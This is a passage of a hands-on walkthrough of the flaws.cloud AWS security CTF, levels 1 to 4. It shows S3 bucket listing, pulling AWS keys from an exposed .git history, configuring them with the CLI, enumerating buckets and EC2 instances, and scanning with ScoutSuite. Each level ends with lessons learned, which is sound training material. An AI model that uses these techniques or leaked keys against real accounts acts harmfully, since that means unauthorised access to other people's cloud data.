@@ -1,0 +1,1352 @@
+=====================================================================================================
+Walkthrough of the AWS Cloud security "FLAWS 1' CTF from "Summit Route"
+=====================================================================================================
+
+* URL: http://flaws.cloud/
+
+* Description:
+Through a series of levels you'll learn about common mistakes and gotchas when using Amazon Web Services (AWS). 
+There are no SQL injection, XSS, buffer overflows, or many of the other vulnerabilities you might have seen before. 
+As much as possible, these are AWS specific issues. 
+
+=====================================================================================================
+LEVEL 1 - Vulnerability: S3 bucket's listing access permission set to "Everyone"
+=====================================================================================================
+* Info: This level is *buckets* of fun. See if you can find the first sub-domain. 
+* Target: flaws.cloud
+
+1. Information gathering using DNS requests
+=============================================
+
+PS C:\Users\jean> nslookup -q=any flaws.cloud
+
+					Serveur :   UnKnown
+					Address:  192.168.1.254
+
+					Réponse ne faisant pas autorité :
+					flaws.cloud     internet address = 52.218.246.210
+					flaws.cloud     nameserver = ns-1061.awsdns-04.org
+					flaws.cloud     nameserver = ns-1890.awsdns-44.co.uk
+					flaws.cloud     nameserver = ns-448.awsdns-56.com
+					flaws.cloud     nameserver = ns-966.awsdns-56.net
+					flaws.cloud
+							primary name server = ns-1890.awsdns-44.co.uk
+							responsible mail addr = awsdns-hostmaster.amazon.com
+							serial  = 1
+							refresh = 7200 (2 hours)
+							retry   = 900 (15 mins)
+							expire  = 1209600 (14 days)
+							default TTL = 86400 (1 day)
+			
+			
+PS C:\Users\jean> nslookup 52.218.246.210
+
+					Serveur :   UnKnown
+					Address:  192.168.1.254
+					Nom :    s3-website-us-west-2.amazonaws.com
+					Address:  52.218.246.210
+
+=> The website flaws.cloud is hosted on a S3 bucket in AWS in the US (region: us-west-2).
+
+
+2. Information gathering using the "AWS client" (Listing the unprotected S3 buckets)
+====================================================================================
+
+➤ ssh -i "Jeff-Linux-key.pem" ec2-user@<snip>.us-east-2.compute.amazonaws.com
+
+X11 forwarding request failed on channel 0
+Last login: Tue Jan 21 16:37:50 2020 from <snip>.us-east-2.compute.amazonaws.com
+       __|  __|_  )
+       _|  (     /   Amazon Linux 2 AMI
+      ___|\___|___|
+
+https://aws.amazon.com/amazon-linux-2/
+
+[ec2-user ~]$ aws s3 ls  s3://flaws.cloud/ --no-sign-request --region us-west-2
+
+							2017-03-14 03:00:38       2575 hint1.html
+							2017-03-03 04:05:17       1707 hint2.html
+							2017-03-03 04:05:11       1101 hint3.html
+							2018-07-10 16:47:16       3082 index.html
+							2018-07-10 16:47:16      15979 logo.png
+							2017-02-27 01:59:28         46 robots.txt
+							2017-02-27 01:59:30       1051 secret-dd02c7c.html
+
+[ec2-user ~]$
+
+=> There is a secret file named "http://flaws.cloud/secret-dd02c7c.htm" that give us the link to the level 2.
+    
+   "Level 2 is at http://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud"
+
+   
+Side note (not useful for this game)
+======================================
+All S3 buckets, when configured for web hosting, are given an AWS domain you can use to browse to it without setting up your own DNS. 
+In this case, flaws.cloud can also be visited by going to http://flaws.cloud.s3-website-us-west-2.amazonaws.com/ 
+
+=> Browsing the URL http://flaws.cloud.s3.amazonaws.com/ allow to list the files due to the permissions issues on this bucket. 
+   
+		<?xml version="1.0" encoding="UTF-8"?>
+		-<ListBucketResult xmlns="http://s3.amazonaws.com/doc/2006-03-01/">
+		<Name>flaws.cloud</Name>
+		<Prefix/>
+		<Marker/>
+		<MaxKeys>1000</MaxKeys>
+		<IsTruncated>false</IsTruncated>
+
+		-<Contents>
+		<Key>hint1.html</Key>
+		<LastModified>2017-03-14T03:00:38.000Z</LastModified>
+		<ETag>"f32e6fbab70a118cf4e2dc03fd71c59d"</ETag>
+		<Size>2575</Size>
+		<StorageClass>STANDARD</StorageClass>
+		</Contents>
+
+		-<Contents>
+		<Key>hint2.html</Key>
+		<LastModified>2017-03-03T04:05:17.000Z</LastModified>
+		<ETag>"565f14ec1dce259789eb919ead471ab9"</ETag>
+		<Size>1707</Size>
+		<StorageClass>STANDARD</StorageClass>
+		</Contents>
+
+		-<Contents>
+		<Key>hint3.html</Key>
+		<LastModified>2017-03-03T04:05:11.000Z</LastModified>
+		<ETag>"ffe5dc34663f83aedaffa512bec04989"</ETag>
+		<Size>1101</Size>
+		<StorageClass>STANDARD</StorageClass>
+		</Contents>
+
+		-<Contents>
+		<Key>index.html</Key>
+		<LastModified>2018-07-10T16:47:16.000Z</LastModified>
+		<ETag>"ddd133aef0f381cf0440d5f09648791d"</ETag>
+		<Size>3082</Size>
+		<StorageClass>STANDARD</StorageClass>
+		</Contents>
+
+		-<Contents>
+		<Key>logo.png</Key>
+		<LastModified>2018-07-10T16:47:16.000Z</LastModified>
+		<ETag>"0623bdd28190d0583ef58379f94c2217"</ETag>
+		<Size>15979</Size>
+		<StorageClass>STANDARD</StorageClass>
+		</Contents>
+
+		-<Contents>
+		<Key>robots.txt</Key>
+		<LastModified>2017-02-27T01:59:28.000Z</LastModified>
+		<ETag>"9e6836f2de6d6e6691c78a1902bf9156"</ETag>
+		<Size>46</Size>
+		<StorageClass>STANDARD</StorageClass>
+		</Contents>
+
+		-<Contents>
+		<Key>secret-dd02c7c.html</Key>
+
+
+=> There is a secret file named "http://flaws.cloud.s3.amazonaws.com/secret-dd02c7c.htm" that give us the link to the level 2.
+    
+   "Level 2 is at http://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud"
+
+   
+*****************************************************************************************************
+ Level 1 - Lesson learned
+*****************************************************************************************************
+On AWS you can set up S3 buckets with all sorts of permissions and functionality including using them to host static files. 
+A number of people accidentally open them up with permissions that are too loose. 
+Just like how you shouldn't allow directory listings of web servers, you shouldn't allow bucket listings. 
+Examples of this problem:
+• Directory listing of S3 bucket of Legal Robot (link) and Shopify (link). 
+• Read and write permissions to S3 bucket for Shopify again (link) and Udemy (link). 
+  This challenge did not have read and write permissions, as that would destroy the challenge for other players, but it is a common problem. 
+
+Avoiding the mistake
+By default, S3 buckets are private and secure when they are created. 
+To allow it to be accessed as a web page, I had turn on "Static Website Hosting" and changed the bucket policy to allow everyone "s3:GetObject" privileges, 
+which is fine if you plan to publicly host the bucket as a web page. 
+But then to introduce the flaw, I changed the permissions to add "Everyone" to have "List" permissions. 
+
+
+=====================================================================================================
+LEVEL 2 - Vulnerability: bucket's listing access permission set to "Any Authenticated AWS User"
+=====================================================================================================
+* Info: The next level is fairly similar, with a slight twist. You're going to need your own AWS account for this. You just need the free tier. 
+* Target: http://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud
+
+
+=> First I tried to list the S3 bucket contents with no account and then with an AWS account that doesn't not have the IAM policy "AmazonS3FullAccess" attached to it. 
+   Obviously it did not worked.
+
+[ec2-user ~]$ aws s3 ls s3://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud
+Unable to locate credentials. You can configure credentials by running "aws configure".
+
+[ec2-user ~]$ aws s3 --profile auditor ls s3://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud
+An error occurred (AccessDenied) when calling the ListObjectsV2 operation: Access Denied
+
+[ec2-user ~]$ aws s3api --profile auditor list-objects-v2 --bucket  level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud
+An error occurred (AccessDenied) when calling the ListObjectsV2 operation: Access Denied
+
+
+=> To be sure that I can access to the S3 bucket my user needs to have the IAM policy "AmazonS3FullAccess" attached to it. 
+   So I added it to my 2 IAM AWS user accounts 'auditor' and 'testuser' and I tried to access to the S3 bucket. 
+   Strangely it worked only with 1 of my 2 accounts.
+
+[ec2-user ~]$ aws --profile auditor iam list-attached-user-policies --user-name auditor
+{
+    "AttachedPolicies": [
+        {
+            "PolicyName": "AmazonS3FullAccess",
+            "PolicyArn": "arn:aws:iam::aws:policy/AmazonS3FullAccess"
+        },
+        {
+            "PolicyName": "AdministratorAccess",
+            "PolicyArn": "arn:aws:iam::aws:policy/AdministratorAccess"
+        },
+        {
+            "PolicyName": "AmazonS3ReadOnlyAccess",
+            "PolicyArn": "arn:aws:iam::aws:policy/AmazonS3ReadOnlyAccess"
+        }
+    ]
+}
+
+[ec2-user ~]$ aws --profile auditor iam list-attached-user-policies --user-name Testuser
+{
+    "AttachedPolicies": [
+        {
+            "PolicyName": "AmazonS3FullAccess",
+            "PolicyArn": "arn:aws:iam::aws:policy/AmazonS3FullAccess"
+        }
+    ]
+}
+
+[ec2-user ~]$ aws s3 --profile Testuser ls s3://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud
+
+2017-02-27 02:02:15      80751 everyone.png
+2017-03-03 03:47:17       1433 hint1.html
+2017-02-27 02:04:39       1035 hint2.html
+2017-02-27 02:02:14       2786 index.html
+2017-02-27 02:02:14         26 robots.txt
+2017-02-27 02:02:15       1051 secret-e4443fc.html
+
+
+[ec2-user ~]$ aws s3api --profile Testuser list-objects-v2 --bucket  level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud
+None
+CONTENTS        "d51ce30087f1fba84d6fb4d0cfc5f872"      everyone.png    		2017-02-27T02:02:15.000Z        80751   STANDARD
+CONTENTS        "ba4f41589527d0fa7fd4fb87a1f91348"      hint1.html      		2017-03-03T03:47:17.000Z        1433    STANDARD
+CONTENTS        "1641e5bb8e63e63a26bc16e07c9c563b"      hint2.html      		2017-02-27T02:04:39.000Z        1035    STANDARD
+CONTENTS        "bbc2900889794698e208a26ce3087b6f"      index.html      		2017-02-27T02:02:14.000Z        2786    STANDARD
+CONTENTS        "bbbcde0b15cabd06aace1df82d335978"      robots.txt      		2017-02-27T02:02:14.000Z        26      STANDARD
+CONTENTS        "8207323f2b9dcfc5983421452f91ad5f"      secret-e4443fc.html     2017-02-27T02:02:15.000Z        1051    STANDARD
+
+
+=> There is a secret file named "http://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud/secret-e4443fc.html" that give us the link to the level 3.
+    
+   "Level 3 is at http://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/"
+
+   
+*****************************************************************************************************
+Level 2 - Lesson learned
+*****************************************************************************************************
+Similar to opening permissions to "Everyone", people accidentally open permissions to "Any Authenticated AWS User". 
+They might mistakenly think this will only be users of their account, when in fact it means anyone that has an AWS account. 
+Examples of this problem
+•Open permissions for authenticated AWS user on Shopify (link) 
+
+Avoiding the mistake
+Only open permissions to specific AWS users.    
+
+
+=====================================================================================================
+Level 3 - Vulnerability: + Bucket listing access to 'Everyone' 
+                         + AWS keys disclosure in GIT repository kept in the bucket
+=====================================================================================================
+
+* Target: http://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/
+
+
+=> First I listed and downloaded the content of the S3 bucket
+
+[ec2-user ~]$ aws s3 --profile Testuser ls s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud
+                           PRE .git/
+2017-02-27 00:14:33     123637 authenticated_users.png
+2017-02-27 00:14:34       1552 hint1.html
+2017-02-27 00:14:34       1426 hint2.html
+2017-02-27 00:14:35       1247 hint3.html
+2017-02-27 00:14:33       1035 hint4.html
+2017-02-27 02:05:16       1703 index.html
+2017-02-27 00:14:33         26 robots.txt
+
+[ec2-user ~]$ aws s3 ls s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/
+                           PRE hooks/
+                           PRE info/
+                           PRE logs/
+                           PRE objects/
+                           PRE refs/
+2017-09-17 15:12:24         52 COMMIT_EDITMSG
+2017-09-17 15:12:24         23 HEAD
+2017-09-17 15:12:24        130 config
+2017-09-17 15:12:24         73 description
+2017-09-17 15:12:24        600 index
+[ec2-user ~]$
+
+[ec2-user ~]$ aws s3 sync s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/ . --no-sign-request
+
+download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/COMMIT_EDITMSG to .git/COMMIT_EDITMSG
+download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/description to .git/description
+download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/HEAD to .git/HEAD
+download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/index to .git/index
+download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/config to .git/config
+download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/info/exclude to .git/info/exclude
+download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/hooks/update.sample to .git/hooks/update.sample
+download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/hooks/pre-commit.sample to .git/hooks/pre-commit.sample
+download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/logs/HEAD to .git/logs/HEAD
+download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/hooks/pre-rebase.sample to .git/hooks/pre-rebase.sample
+download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/hooks/prepare-commit-msg.sample to .git/hooks/prepare-commit-msg.sample
+download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/logs/refs/heads/master to .git/logs/refs/heads/master
+download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/hooks/post-update.sample to .git/hooks/post-update.sample
+download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/objects/2f/c08f72c2135bb3af7af5803abb77b3e240b6df to .git/objects/2f/c08f72c2135bb3af7af5803abb77b3e240b6df
+download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/objects/61/a5ff2913c522d4cf4397f2500201ce5a8e097b to .git/objects/61/a5ff2913c522d4cf4397f2500201ce5a8e097b
+download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/objects/53/23d77d2d914c89b220be9291439e3da9dada3c to .git/objects/53/23d77d2d914c89b220be9291439e3da9dada3c
+download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/objects/b6/4c8dcfa8a39af06521cf4cb7cdce5f0ca9e526 to .git/objects/b6/4c8dcfa8a39af06521cf4cb7cdce5f0ca9e526
+download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/objects/92/d5a82ef553aae51d7a2f86ea0a5b1617fafa0c to .git/objects/92/d5a82ef553aae51d7a2f86ea0a5b1617fafa0c
+download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/objects/c2/aab7e03933a858d1765090928dca4013fe2526 to .git/objects/c2/aab7e03933a858d1765090928dca4013fe2526
+download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/hooks/pre-applypatch.sample to .git/hooks/pre-applypatch.sample
+download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/refs/heads/master to .git/refs/heads/master
+download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/hooks/commit-msg.sample to .git/hooks/commit-msg.sample
+download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/objects/db/932236a95ebf8c8a7226432cf1880e4b4017f2 to .git/objects/db/932236a95ebf8c8a7226432cf1880e4b4017f2
+download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/objects/f5/2ec03b227ea6094b04e43f475fb0126edb5a61 to .git/objects/f5/2ec03b227ea6094b04e43f475fb0126edb5a61
+download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/objects/f2/a144957997f15729d4491f251c3615d508b16a to .git/objects/f2/a144957997f15729d4491f251c3615d508b16a
+download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/hooks/applypatch-msg.sample to .git/hooks/applypatch-msg.sample
+download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/hint1.html to ./hint1.html
+download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/hint2.html to ./hint2.html
+download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/objects/76/e4934c9de40e36f09b4e5538236551529f723c to .git/objects/76/e4934c9de40e36f09b4e5538236551529f723c
+download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/robots.txt to ./robots.txt
+download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/hint4.html to ./hint4.html
+download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/index.html to ./index.html
+download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/objects/e3/ae6dd991f0352cc307f82389d354c65f1874a2 to .git/objects/e3/ae6dd991f0352cc307f82389d354c65f1874a2
+download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/hint3.html to ./hint3.html
+download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/objects/0e/aa50ae75709eb4d25f07195dc74c7f3dca3e25 to .git/objects/0e/aa50ae75709eb4d25f07195dc74c7f3dca3e25
+download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/authenticated_users.png to ./authenticated_users.png
+
+=> Looking at the .git directory
+
+[ec2-user .git]$ ls -al
+total 20
+drwxrwxr-x  7 ec2-user ec2-user 150 Apr  8 19:02 .
+drwxrwxr-x  3 ec2-user ec2-user 157 Apr  8 19:07 ..
+-rw-rw-r--  1 ec2-user ec2-user  52 Sep 17  2017 COMMIT_EDITMSG
+-rw-rw-r--  1 ec2-user ec2-user 130 Sep 17  2017 config
+-rw-rw-r--  1 ec2-user ec2-user  73 Sep 17  2017 description
+-rw-rw-r--  1 ec2-user ec2-user  23 Sep 17  2017 HEAD
+drwxrwxr-x  2 ec2-user ec2-user 219 Apr  8 19:02 hooks
+-rw-rw-r--  1 ec2-user ec2-user 600 Sep 17  2017 index
+drwxrwxr-x  2 ec2-user ec2-user  21 Apr  8 19:02 info
+drwxrwxr-x  3 ec2-user ec2-user  30 Apr  8 19:02 logs
+drwxrwxr-x 14 ec2-user ec2-user 126 Apr  8 19:02 objects
+drwxrwxr-x  3 ec2-user ec2-user  19 Apr  8 19:02 refs
+
+
+=> Exploring the development history with the command "git log"
+
+[ec2-user .git]$ git log
+commit b64c8dcfa8a39af06521cf4cb7cdce5f0ca9e526 (HEAD -> master)
+Author: 0xdabbad00 <scott@summitroute.com>
+Date:   Sun Sep 17 09:10:43 2017 -0600
+
+    Oops, accidentally added something I shouldn't have
+
+commit f52ec03b227ea6094b04e43f475fb0126edb5a61
+Author: 0xdabbad00 <scott@summitroute.com>
+Date:   Sun Sep 17 09:10:07 2017 -0600
+
+    first commit
+
+=> Following the information provided in the logs, let's do a diff of the 2 commits 
+   AWS credentials are disclosed :-)
+
+[ec2-user .git]$ git diff f52ec03b227ea6094b04e43f475fb0126edb5a61 b64c8dcfa8a39af06521cf4cb7cdce5f0ca9e526
+diff --git a/access_keys.txt b/access_keys.txt
+deleted file mode 100644
+index e3ae6dd..0000000
+--- a/access_keys.txt
++++ /dev/null
+@@ -1,2 +0,0 @@
+-access_key AKIAJ366LIPB4IJKT7SA
+-secret_access_key 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
+
+
+=> I created a new profile with the AWS keys that I just discovered
+
+[ec2-user .git]$ aws configure --profile flaws-level3
+AWS Access Key ID [None]: AKIAJ366LIPB4IJKT7SA
+AWS Secret Access Key [None]: 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
+Default region name [None]:
+Default output format [None]: text
+[ec2-user .git]$
+
+
+=> Listing all S3 buckets accessible with the AWS keys discovered
+
+[ec2-user .git]$ aws s3api --profile flaws-level3 list-buckets
+BUCKETS 2017-02-12T21:31:07.000Z        2f4e53154c0a7fd086a04a12a452c2a4caed8da0.flaws.cloud
+BUCKETS 2017-05-29T16:34:53.000Z        config-bucket-975426262029
+BUCKETS 2017-02-12T20:03:24.000Z        flaws-logs
+BUCKETS 2017-02-05T03:40:07.000Z        flaws.cloud
+BUCKETS 2017-02-24T01:54:13.000Z        level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud
+BUCKETS 2017-02-26T18:15:44.000Z        level3-9afd3927f195e10225021a578e6f78df.flaws.cloud
+BUCKETS 2017-02-26T18:16:06.000Z        level4-1156739cfb264ced6de514971a4bef68.flaws.cloud
+BUCKETS 2017-02-26T19:44:51.000Z        level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud
+BUCKETS 2017-02-26T19:47:58.000Z        level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud
+BUCKETS 2017-02-26T20:06:32.000Z        theend-797237e8ada164bf9f12cebf93b282cf.flaws.cloud
+OWNER   0xdabbad00      d70419f1cb589d826b5c2b8492082d193bca52b1e6a81082c36c993f367a5d73
+
+
+=> Let's see "WHOAMI"
+
+[ec2-user FLAWS]$ aws --profile flaws-level3 sts get-caller-identity
+{
+    "Account": "975426262029",
+    "UserId": "AIDAJQ3H5DC3LEG2BKSLC",
+    "Arn": "arn:aws:iam::975426262029:user/backup"
+}
+
+
+*****************************************************************************************************
+Level 3 - Lesson learned
+*****************************************************************************************************
+People often leak AWS keys and then try to cover up their mistakes without revoking the keys. 
+You should always revoke any AWS keys (or any secrets) that could have been leaked or were misplaced. 
+Roll your secrets early and often.
+
+Examples of this problem
+Instagram's Million Dollar Bug: In this must read post, a bug bounty researcher uncovered a series of flaws, 
+including finding an S3 bucket that had .tar.gz archives of various revisions of files. 
+One of these archives contained AWS creds that then allowed the researcher to access all S3 buckets of Instagram. 
+For more discussion of how some of the problems discovered could have been avoided, see the post "Instagram's Million Dollar Bug": Case study for defense
+Another interesting issue this level has exhibited, although not that worrisome, is that you can't restrict the ability to list only certain buckets in AWS,
+so if you want to give an employee the ability to list some buckets in an account, they will be able to list them all. 
+The key you used to discover this bucket can see all the buckets in the account. You can't see what is in the buckets, 
+but you'll know they exist. Similarly, be aware that buckets use a global namespace meaning that bucket names must be unique across all customers,
+so if you create a bucket named `merger_with_company_Y` or something that is supposed to be secret, it's technically possible for someone to discover that bucket exists.
+
+Avoiding this mistake
+Always roll your secrets if you suspect they were compromised or made public or stored or shared incorrectly. 
+Roll early, roll often. Rolling secrets means that you revoke the keys (ie. delete them from the AWS account) and generate new ones.
+
+============================================================================================================
+LEVEL 4 - Vulnerability: the snapshot of an EC2 instance is made accessible to all AWS users (i.e. 'Public')
+============================================================================================================
+* Info: For the next level, you need to get access to the web page running on an EC2 at 4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud
+  It'll be useful to know that a snapshot was made of that EC2 shortly after nginx was setup on it.
+
+* Target: http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud
+
+
+=> List the EC2 instances with the AWS credentials that we discovered in the Level 3
+
+[ec2-user FLAWS]$ aws ec2 --profile flaws-level3 describe-instances
+You must specify a region. You can also configure your region by running "aws configure".
+
+[ec2-user FLAWS]$ aws ec2 --profile flaws-level3 describe-instances --region us-east-1
+
+[ec2-user FLAWS]$ aws ec2 --profile flaws-level3 describe-instances --region us-west-1
+
+[ec2-user FLAWS]$ nslookup 4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud
+
+								Server:         172.31.0.2
+								Address:        172.31.0.2#53
+
+								Non-authoritative answer:
+								4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud    canonical name = ec2-35-165-182-7.us-west-2.compute.amazonaws.com.
+								Name:   ec2-35-165-182-7.us-west-2.compute.amazonaws.com
+								Address: 35.165.182.7
+
+								
+[ec2-user FLAWS]$ aws ec2 --profile flaws-level3 describe-instances --region us-west-2
+
+RESERVATIONS    975426262029    r-0fe151dbbe77e90cc
+INSTANCES       0       x86_64  kTOiC1486938563883      False   xen     ami-7c803d1c    i-05bef8a081f307783     t2.micro        Default 2017-02-12T22:29:24.000Z      ip-172-31-41-84.us-west-2.compute.internal      172.31.41.84    ec2-35-165-182-7.us-west-2.compute.amazonaws.com        35.165.182.7    /dev/sda1    ebs      True            subnet-d962aa90 hvm     vpc-1052ce77
+BLOCKDEVICEMAPPINGS     /dev/sda1
+EBS     2017-02-12T22:29:25.000Z        True    attached        vol-04f1c039bc13ea950
+CAPACITYRESERVATIONSPECIFICATION        open
+CPUOPTIONS      1       1
+HIBERNATIONOPTIONS      False
+IAMINSTANCEPROFILE      arn:aws:iam::975426262029:instance-profile/flaws        AIPAIK7LV6U6UXJXQQR3Q
+METADATAOPTIONS enabled 1       optional        applied
+MONITORING      disabled
+NETWORKINTERFACES               interface       06:b0:7a:92:21:cf       eni-c26ed780    975426262029    ip-172-31-41-84.us-west-2.compute.internal      172.31.41.84  True    in-use  subnet-d962aa90 vpc-1052ce77
+ASSOCIATION     amazon  ec2-35-165-182-7.us-west-2.compute.amazonaws.com        35.165.182.7
+ATTACHMENT      2017-02-12T22:29:24.000Z        eni-attach-a4901fc2     True    0       attached
+GROUPS  sg-490f6631     launch-wizard-1
+PRIVATEIPADDRESSES      True    ip-172-31-41-84.us-west-2.compute.internal      172.31.41.84
+ASSOCIATION     amazon  ec2-35-165-182-7.us-west-2.compute.amazonaws.com        35.165.182.7
+PLACEMENT       us-west-2a              default
+SECURITYGROUPS  sg-490f6631     launch-wizard-1
+STATE   16      running
+STATEREASON
+
+=> I decided to run the AWS security scanner ScoutSuite (https://github.com/nccgroup/ScoutSuite) 
+
+[ec2-user ScoutSuite-master]$ python3 scout.py aws --profile flaws-level3
+		<SNIP>
+		2020-04-09 13:22:36 <snip>.us-east-2.compute.internal scout[32610] INFO Running rule engine
+		2020-04-09 13:22:37 <snip>.us-east-2.compute.internal scout[32610] INFO Applying display filters
+		2020-04-09 13:22:37 <snip>.us-east-2.compute.internal scout[32610] INFO Saving data to scoutsuite-report/scoutsuite-results/scoutsuite_results_aws-flaws-level3.js
+		2020-04-09 13:22:37 <snip>.us-east-2.compute.internal scout[32610] INFO Saving data to scoutsuite-report/scoutsuite-results/scoutsuite_exceptions_aws-flaws-level3.js
+		2020-04-09 13:22:37 <snip>.us-east-2.compute.internal scout[32610] INFO Saving data to scoutsuite-report/scoutsuite-results/scoutsuite_errors_aws-flaws-level3.json
+		2020-04-09 13:22:37 <snip>.us-east-2.compute.internal scout[32610] INFO Creating scoutsuite-report/aws-flaws-level3.html
+		2020-04-09 13:22:37 <snip>.us-east-2.compute.internal scout[32610] INFO Opening the HTML report
+		
+[ec2-user ScoutSuite-master]$
+
+=> ScoutSuite's EC2 Dashboard for Flaws.cloud display several vulnerabilities including the presence of unencrypted 
+   and publicly accessible EC2 / EBS snapshot...
+
+   > [Danger] EBS snapshot not encrypted
+ 
+			Flaws backup 2017.02.27
+			Information
+				+ Id: snap-0b49342abd1bdcb89
+				+ Date: 2017-02-28 01:35:12+00:00
+				+ Description:
+				+ State: completed
+				+ Encrypted: false
+				+ Volume: vol-04f1c039bc13ea950
+				+ Is public: true
+ 
+   > [Danger] EBS volume not encrypted
+ 
+			vol-04f1c039bc13ea950
+				Attributes
+				+ Attachments:
+				+ 0:
+					AttachTime: 2017-02-12 22:29:25+00:00
+					DeleteOnTermination: true
+					Device: /dev/sda1
+					InstanceId: i-05bef8a081f307783
+					State: attached
+					VolumeId: vol-04f1c039bc13ea950
+				+ AvailabilityZone: us-west-2a
+				+ CreateTime: 2017-02-12 22:29:24.999000+00:00
+				+ Encrypted: false
+				<SNIP>
+				+ SnapshotId: snap-0f23409e560e2f059
+				+ State: in-use
+				+ VolumeType: gp2
+				+ id: vol-04f1c039bc13ea950
+				+ name: vol-04f1c039bc13ea950
+				+ service: ec2
+				+ region: us-west-2
+				<SNIP>
+	 
+   > [Danger] Public EBS snapshot
+	 
+			Flaws backup 2017.02.27
+			Information
+				+ Id: snap-0b49342abd1bdcb89
+				+ Date: 2017-02-28 01:35:12+00:00
+				+ Description:
+				+ State: completed
+				+ Encrypted: false
+				+ Volume: vol-04f1c039bc13ea950
+				+ Is public: true
+ 
+   > [Danger] SSH port open to all
+   > [Warning] All ports open
+   > [Warning] Non-empty rulesets for default security groups
+   > [Warning] Unrestricted network traffic within security group
+   > [Warning] Unused Security Groups
+   > [Warning] Use of port ranges
+   > [Good] All ports open to all
+   > [Good] Default security groups in use
+   > [Good] DNS port open to all
+   > [Good] FTP port open
+   > [Good] MongoDB port open to all
+   > [Good] MsSQL port open to all
+   > [Good] MySQL port open to all
+   > [Good] NFS port open to all
+   > [Good] Oracle DB port open to all
+   > [Good] PostgreSQL port open to all
+   > [Good] RDP port open to all
+   > [Good] Secrets in instance user data (potential)
+   > [Good] Security group whitelists AWS CIDRs
+   > [Good] SMTP port open to all
+   > [Good] TCP port open to all
+   > [Good] Telnet port open
+   > [Good] UDP port open to all
+
+
+=> If we check manually...
+
+[ec2-user FLAWS]$ aws configure --profile flaws-level3
+	AWS Access Key ID [****************T7SA]: AKIAJ366LIPB4IJKT7SA
+	AWS Secret Access Key [****************3Jys]: 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
+	Default region name [None]: us-west-2
+	Default output format [text]: json
+
+
+[ec2-user FLAWS]$ aws ec2 --profile flaws-level3 describe-instances
+	{
+		"Reservations": [
+			{
+				"Instances": [
+					{
+						"Monitoring": {
+							"State": "disabled"
+						},
+						"PublicDnsName": "ec2-35-165-182-7.us-west-2.compute.amazonaws.com",
+						"StateReason": {
+							"Message": "",
+							"Code": ""
+						},
+						"State": {
+							"Code": 16,
+							"Name": "running"
+						},
+						"EbsOptimized": false,
+						"LaunchTime": "2017-02-12T22:29:24.000Z",
+						"PublicIpAddress": "35.165.182.7",
+						"PrivateIpAddress": "172.31.41.84",
+						"ProductCodes": [],
+						"VpcId": "vpc-1052ce77",
+						"CpuOptions": {
+							"CoreCount": 1,
+							"ThreadsPerCore": 1
+						},
+						"StateTransitionReason": "",
+						"InstanceId": "i-05bef8a081f307783",
+						"ImageId": "ami-7c803d1c",
+						"PrivateDnsName": "ip-172-31-41-84.us-west-2.compute.internal",
+						"KeyName": "Default",
+						"SecurityGroups": [
+							{
+								"GroupName": "launch-wizard-1",
+								"GroupId": "sg-490f6631"
+							}
+						],
+						"ClientToken": "kTOiC1486938563883",
